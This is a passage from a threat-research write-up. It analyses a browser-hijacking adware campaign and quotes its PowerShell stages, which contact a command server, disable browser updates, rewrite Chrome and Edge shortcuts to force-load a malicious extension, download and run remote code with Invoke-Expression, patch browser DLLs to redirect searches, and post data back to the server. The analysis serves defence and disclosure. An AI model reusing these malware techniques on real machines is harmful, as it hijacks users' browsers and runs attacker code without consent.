}</pre><p>The script contacts the C2 with a unique UID and receives in return execution parameters establishing where to save downloaded files, what to download, which extensions to install, what the arguments of the modified “.lnk” target will be, version number, restart, and last but not least, a download link for the Stage 3 script.</p><p>There are a couple of domains that the malware uses, but the pattern repeats itself with “http://domainname.com/apps/$uid”. For example, in one case: “http[:][//]wincloudservice[.]com/apps/$uid”.</p><pre class="styles_Article-Code__V7O9i">$uid = &#x27;asdasdasdd5d94e0-e44e-41a8-b222-2222224ee22&#x27;;
$uid;
$wc = New-Object system.Net.WebClient;
$services = $wc.downloadString(&quot;http[:][//]wincloudservice[.]com[/]apps[/]$uid&quot;).Trim();
$services = $ser.DeserializeObject($services);</pre><p>This is what a typical response from the C2 looks like:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27142%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg9.e6d1b8de.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg9.e6d1b8de.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg9.e6d1b8de.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>Or, beautified:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27557%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg10.3d43edbf.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg10.3d43edbf.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg10.3d43edbf.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><h3 id="removeUpdates" class="subtitle1 subtitle1_bold">removeUpdates</h3><p>The script proceeds to disable all updates of the browsers because during each update the default settings are restored and this would interfere with the activity of the malware.</p><pre class="styles_Article-Code__V7O9i">function removeUpdates(){
    param();
    Remove-Item HKLM:\SYSTEM\ControlSet001\Services\gupdate -Recurse;
    Remove-Item HKLM:\SYSTEM\ControlSet001\Services\gupdatem -Recurse;
    Remove-Item HKLM:\SYSTEM\CurrentControlSet\Services\gupdate -Recurse;
    Remove-Item HKLM:\SYSTEM\CurrentControlSet\Services\gupdatem -Recurse;
    Remove-Item &#x27;C:\\Program Files (x86)\\Google\\Update&#x27; -Recurse
    Remove-Item &#x27;C:\\Program Files (x86)\\Microsoft\\EdgeUpdate&#x27; -Recurse
    Remove-Item &#x27;C:\\Program Files\\Google\\Update&#x27; -Recurse
    Remove-Item &#x27;C:\\Program Files\\Microsoft\\EdgeUpdate&#x27; -Recurse}</pre><h3 id="Main" class="subtitle1 subtitle1_bold">Main</h3><p>The final stage is to modify shortcut “.lnk” files of browsers, download external files, and execute the next stage script. The script gets the installation directory from the C2 (“$CLocalPath”), then checks if it’s already installed and if the version of the extension is different from the recent (param “v”). It will then traverse recursively on all “.lnk” shortcut files under the “C:\” folder and if it is of chrome.exe or msedge.exe, it will inject the parameters from the C2:</p><pre class="styles_Article-Code__V7O9i">$shortcut = $Shell.CreateShortcut($s.Fullname)
$shortcut.Arguments = &quot;$CArgs --load-extension=$CLocalPath&quot;;</pre><p>After it’s done it will look like this:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%2783%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg11.b3c3c44c.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg11.b3c3c44c.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg11.b3c3c44c.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>The injected string depends on the default browser, but in general, the script consists of extra parameters to be loaded with the usual startup of the browser. The parameters change the default home page to “customsearchbar[.]me”, disable update detection by using “disable-feature=“<a href="https://source.chromium.org/chromium/chromium/src/+/HEAD:chrome/browser/upgrade_detector/upgrade_detector_impl.cc;l=204" target="_blank" rel="noreferrer">outdatedbuilddetector</a>” and lastly by using “--extensions-on-chrome-urls”<!-- --> <a href="https://source.chromium.org/chromium/chromium/src/+/main:extensions/docs/security_faq.md?q=extensions-on-chrome-url&amp;ss=chromium%2Fchromium%2Fsrc" target="_blank" rel="noreferrer">removes protection</a> <!-- -->from Chrome sensitive pages with the pattern of chrome:-scheme (such as chrome://settings).</p><p>By default, those pages are protected from extensions, but if the browser starts with this command line, those protections are turned off, thus allowing extensions to access those pages.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27165%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg12.f39c7b5d.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg12.f39c7b5d.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg12.f39c7b5d.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span><figcaption>(screenshot from chromium documentation)</figcaption></p><pre class="styles_Article-Code__V7O9i">$CArgs = $services.args.c;
$EArgs = $services.args.e;
$CLocal = $services.local.c;
$CLocalPath = $CLocal.path;

try{
	$currentLocalV = (Get-Content &quot;$CLocalPathersion.txt&quot;);
	$currentLocalV  = [Decimal]$currentLocalV ;}
catch{	$currentLocalV  = 0;}

if ($CArgs){
   $Shortcuts =  Get-ChildItem -Path &quot;C:\&quot; -Include *.lnk  -Recurse -Force;
    $Shell = New-Object -ComObject WScript.Shell;
    foreach ($s in $Shortcuts) {   
         $target=  $Shell.CreateShortcut($s).TargetPath;
         if ($target -Match &#x27;chrome.exe&#x27;) {
            $shortcut = $Shell.CreateShortcut($s.Fullname)
            $shortcut.Arguments = &quot;$CArgs --load-extension=$CLocalPath&quot;;
            $shortcut.Save();         }
         elseif ($target -Match &#x27;msedge.exe&#x27;) {
            $shortcut = $Shell.CreateShortcut($s.Fullname)
            $shortcut.Arguments = $EArgs;
            $shortcut.Save();</pre><p>The final stage is to download the malicious packed extension files from the C2 parameters in “local.c.files” and download each of them to the malware working folder.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27492%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg13.74a8fcd1.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg13.74a8fcd1.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg13.74a8fcd1.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><pre class="styles_Article-Code__V7O9i">if ($services.local.c){
    if ($currentLocalV -ne $services.local.c.v)    {
        New-Item -Path $CLocalPath -Name &quot;archive.logs&quot; -ItemType &quot;file&quot; -Force
        foreach ($f in $services.local.c.files)
            $fn = $f.split(&#x27;/&#x27;)[-1];
            (New-Object Net.WebClient).DownloadFile($f, &quot;$CLocalPath\$fn&quot;)</pre><p>We can see by the commented outline that in past versions of the PowerShell script, it used to download a zipped extension (in the format of “.crx” file) but now it downloads all of the files as is direct to the folder. The malware no longer uses the unzip function anymore.</p><p>After it downloaded the files, it replaced the userID in the “config.js” file of the malicious extension with the $uid that it used at the beginning of the script to communicate with the C2. That way the attackers could keep track of which $uid downloaded what, and filter out requests without uid.</p><pre class="styles_Article-Code__V7O9i">#Unzip2 &quot;$CLocalPath\logsCache.zip&quot; &quot;$CLocalPath&quot; -Force
        (Get-Content &quot;$CLocalPath\config.js&quot;) -replace &#x27;%USERID%&#x27;, $uid | Set-Content
&quot;$CLocalPath\config.js&quot;</pre><p>It uses another parameter from the C2 to determine whether or not to restart the Chrome process (in the scripts that we saw it is always “True”) - it closes each window of Chrome and restarts it again, but this time using the malicious arguments that open the malicious extension (--load-extension).</p><pre class="styles_Article-Code__V7O9i">if ($services.restart){ try{
        Get-Process chrome | ForEach-Object { $_.CloseMainWindow() | Out-Null}
        start chrome &quot;$CArgs --load-extension=$CLocalPath --restore-last-session&quot;;}</pre><p>The end of the script checks if there are more commands to execute (in our case we got a different script to execute). The commands are supplied in the “rem” (remote?) parameter and executed with “invoke-expression”.</p><pre class="styles_Article-Code__V7O9i">if ($services.rem)
{
    $rem = $wc.downloadString($services.rem).Trim();
    Invoke-Expression $rem;
}</pre><p>We have tracked the changed versions of the operation over the past few years and found that each new file name marks a new campaign that operates during different periods.</p><p>For example, ‘nvwinsearchoptimizer.ps1, which is the newest:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27714%27%20height=%27253%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg14.b8c62681.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg14.b8c62681.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg14.b8c62681.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>compared to ‘privacyblockerwindows.ps1’, an older version:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27746%27%20height=%27275%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg15.25df811d.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg15.25df811d.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg15.25df811d.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><h2 id="ts" class="h3 h3_bold">Third-Stage Script</h2><p>This section refers to the last line of the previous script: “invoke-expression $rem”. As described above, the C2 sends an argument “rem” with a URL to a third-stage script, which it downloads and executes.</p><h3 id="wid" class="subtitle1 subtitle1_bold">What It Does</h3><p>The purpose of this script is to locate the DLLs of the browsers (msedge.dll if Edge is the default one) and to change specific bytes in specific locations within it. Doing so allows the script to hijack the default search from Bing or Google to the adversary’s search portal. It checks which version of the browser is installed and searches the bytes accordingly.</p><p>For example, the recent version of Edge could be “124” and it will be located in the folder: <br/>C:\Program Files (x86)\Microsoft\Edge\Application\124.0.1243\. Thus the malware will check the number prefix because the DLLs have been changed between the versions.</p><pre class="styles_Article-Code__V7O9i" style="color:#F26172">if ($fp -like &quot;*104.*&quot;){
    $offset = $hexString.IndexOf(&quot;77-77-77-2E-62-69-6E-67-2E-63-6F-6D-2F-00-2E-2E-5C-2E-2E&quot;); #104
}
elseif ($fp -like &quot;*102.*&quot;){
    $offset = $hexString.IndexOf(&quot;77-77-77-2E-62-69-6E-67-2E-63-6F-6D-2F-00-2E-2E-2F-2E-2E&quot;); #102
}
elseif ($fp -like &quot;*101.*&quot;){
    $offset = $hexString.IndexOf(&quot;77-77-77-2E-62-69-6E-67-2E-63-6F-6D-2F-00-2E-2E-2F-2E-2E&quot;); #102
}
else{
     $offset = $hexString.IndexOf(&quot;77-77-77-2E-62-69-6E-67-2E-63-6F-6D-2F-00-5F-55-00-41-4E-4F-4E-00&quot;);    #108-122
}
In the new edition, an “else” condition that handles versions #108-122 was added
</pre><p>The bytes that it wants to write inside the DLL translate to: “msf-edge[.]com”, “https[;//]microsearch[.]me/”, and “sourceid=chrom1” (in order of appearance in the code below).</p><pre class="styles_Article-Code__V7O9i">function hexEdit($fp){
$bytes = [System.IO.File]::ReadAllBytes($fp)
$offset1Bytes = @(109,115,102,45,101,100,103,101,46,99,111,109);
$offset2Bytes = @(104,116,116,112,115,58,47,47,109,105,99,114,111,115,101,97,114,99,104,46,109,101,47,00);
$offset3Bytes = @(115,111,117,114,99,101,105,100,61,99,104,114,111,109,49);
$hexString = [System.BitConverter]::ToString($bytes);
$edited = 0;</pre><p>To insert those strings, the script searches accordingly for the offsets of the default values “www.bing.com”(offset1), “https://www.google.com/”(offset2), and “sourceid=chrome” (offset3).</p><pre class="styles_Article-Code__V7O9i">$offset = $hexString.IndexOf(&quot;68-74-74-70-73-3A-2F-2F-77-77-77-2E-67-6F-6F-67-6C-65-2E-63-6F-6D-2F-00&quot;);
 if ($offset -gt 0){
    $offset2 = $offset/3;
    foreach ($b in $offset2Bytes){   if ($bytes[$offset2+$k] -ne $b){...}}

$offset = $hexString.IndexOf(&quot;73-6F-75-72-63-65-69-64-3D-63-68-72-6F-6D-65&quot;);
 if ($offset -gt 0){
    $offset3 = $offset/3;
     foreach ($b in $offset3Bytes){   if ($bytes[$offset3+$k] -ne $b){...}}</pre><p>To make sure it can write back to the file, the processes of the browsers are killed:</p><pre class="styles_Article-Code__V7O9i">taskkill /IM msedge.exe /F;
    taskkill /IM msteams.exe /F;
    taskkill /IM msedgewebview2.exe /F;
    Start-Sleep -Seconds 5;
    <b>[System.IO.File]::WriteAllBytes($fp, $bytes)</b></pre><p>After the changes have been applied, the next time the browser launches and the user searches for something, the query is automatically redirected to “msf-console[.]com”, which redirects to “search-good[.]com”, and finally redirects to “search.yahoo.com”.</p><p>This script will report back to the C2 server both the $uid and the DLL files that it found on the attacked system.</p><pre class="styles_Article-Code__V7O9i">$postParams = @{uid=$uid;files=$files.Fullname | ConvertTo-Json}
<b>    Invoke-WebRequest -Uri &quot;https[:][//]wincloudservice[.]com[/]edll&quot; -UseBasicParsing -Method POST -Body $postParams
</b>    foreach ($f in $files){  hexEdit($f.FullName); }</pre><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27744%27%20height=%27344%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg16.c3579946.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg16.c3579946.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg16.c3579946.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%2734%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg17.cd79e4f1.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg17.cd79e4f1.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg17.cd79e4f1.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27163%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg18.1332441c.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg18.1332441c.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg18.1332441c.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p>The extensions that are forcefully installed are frustrating users. We can see in the example below, specifically from nlmpchkfhgoclkajbifladignhbanjdk yglSearch, users complaining about its activities:</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27444%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg19.86e6d2ce.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg19.86e6d2ce.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg19.86e6d2ce.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><h3 id="cwse-rfi" class="subtitle1 subtitle1_bold">Chrome Web Store Extensions (Registry Forced Install)</h3><p>Extension id for example: nniikbbaboifhfjjkjekiamnfpkdieng</p><p>We first identified the adware Chrome extension called “Custom Search Bar” when we began our research in 2022. The extension was first available in 2021 and by 2022 had amassed more than 60,000 users. Recently, however, that extension no longer appears on the Chrome Web Store and new malicious extensions have surfaced from the same origin. For example, some of the new extensions are called “Micro Search”, which until recently was available for download with over 30,000 users, and “yglSearch”, which is still currently available for download and has over 40,000 users.</p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%27745%27%20height=%27314%27/%3e"/></span><img alt="figure" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="figure" srcSet="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg20.4e766d42.png&amp;w=768&amp;q=75 1x, /_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg20.4e766d42.png&amp;w=1400&amp;q=75 2x" src="/_next/image?url=%2F_next%2Fstatic%2Fmedia%2Fimg20.4e766d42.png&amp;w=1400&amp;q=75" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></p><p><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" 